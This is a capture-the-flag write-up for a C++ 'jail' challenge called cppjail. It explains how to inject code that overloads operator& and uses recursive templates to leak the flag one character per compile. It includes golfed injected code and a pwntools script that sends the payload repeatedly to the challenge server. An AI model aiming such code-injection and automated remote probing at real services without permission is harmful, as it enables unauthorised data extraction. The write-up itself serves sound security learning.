# Writeup for cppjail by pawnlord


This challenge can be broken into 3 parts: getting code executing, getting a character-checker, and code-golfing to actually run the solution.

## getting code to execute
The intended way to get code to execute is to overload the & operator for `Prisoner`. You can't return pointers directly, so you need to get the type through `decltype`. You also need to make sure that different values are returned when the & operator is run on the 2 prisoners, which is done through a global variable as to not need to pass in the prisoner itself (and to have an identifier for decltype). The code to do it is below (without the space constrait being followed cause it's ugly):
```cpp
unsigned j = 0;
decltype(&j) operator&(const Prisoner&) {
    return (decltype(&j))(/* getting character value here */ +(j++)); 
}
```

## checking a character
Checking a character requires a `Lock`. The `Lock` type is only available through a `false_type` Jail, which requires it to fail to substitute the type you give it. You can't define a class or struct, which means the only (and shortest) way to access a false_type is through `Jail<void>`. Once  you have a `Jail<void>`, you have access to `Lock` through `lock`. You can test whether a character is correct for a position through `sizeof(Jail<void>::lock<c,0>::k.i2) == 4`.  
Due to the sleep at the beginning of the compile script, every time the solve script runs it needs to get one character. The max any run can get is 16 if it is able to fill the entire pointer that is printed with characters of the flag for both prisoner1 and prisoner2, though the solve script is still under 7 minutes without this.

### checking for 1 character per build
The basic idea of the solve script is to make a template get recursively invoked until we reach the character for a specific index. The un-obfuscated version for the first character would be:
```cpp
char r(std::bool_constant<true>) {
    return c-1;
}
template<char c>
char r(std::bool_constant<false>){
    return r<c+1>(std::bool_constant<sizeof(Jail<void>::lock<c, 0>::k.i2) == 4>());
}
```
Essentially, for every c, it checks the `sizeof(Jail<void>::lock<c, 0>::k.i2) == 4` from the previous section to check if the character is correct. If it isn't, it calls the overload with the `std::bool_constant<false>` parameter type with the next character, which will then check again. If it is, it will call the overload with the `std::bool_constant<true>` parameter type, which then stops teh template recursion and returns the character that was checked.

## code-golfing
The main part of the code-golf is minimizing repeated types. Repeated types can be eliminated with the `using` keyword. Everything else is the standard removing uneeded whitespace and long identifiers.


## ungolfed and obfuscated injected code
```cpp
static unsigned j=0;
template<decltype(j) c>
decltype(j) r(std::bool_constant<true>) {
    return (decltype(j))(c-1);
}
template<decltype(j) c>
decltype(j) r(std::bool_constant<false>){
    return r<c+1>(std::bool_constant<sizeof(Jail<void>::lock<c, 0>::k.i) == 4>());
}
decltype(&j) operator&(const Prisoner& p) {
    return (decltype(&j))(r<0>(std::bool_constant<false>())+(j++)); 
}
```
## injected code
```cpp
unsigned	j=0;template<bool	b>using	d=std::bool_constant<b>;using	a=decltype(j);	using	t=d<true>;	using	f=d<false>;template<a	c>a	r(t){return(a)(c-1);}template<a	c>a	r(f){return	r<c+1>(d<sizeof(Jail<void>::lock<c,0>::k.i)	==	4>());}a	operator&(Prisoner){return(r<0>(f())+(j++));}
```
## solve script
```py
from pwn import *

format = "unsigned	j=0;template<bool	b>using	d=std::bool_constant<b>;using	a=decltype(j);	using	t=d<true>;	using	f=d<false>;template<a	c>a	r(t){return(a)(c-1);}template<a	c>a	r(f){return	r<c+1>(d<sizeof(Jail<void>::lock<c,%d>::k.i)	==	4>());}a	operator&(Prisoner){return(r<0>(f())+(j++));}"

for i in range(0, 53):
    r = remote("ctf.b01lers.com", 7170)
    code = format % i
    r.sendline(code.encode())
    character = chr(int(r.recvall().split(b" ")[-1], 16) - 3)
    print(character)
    r.close()
```

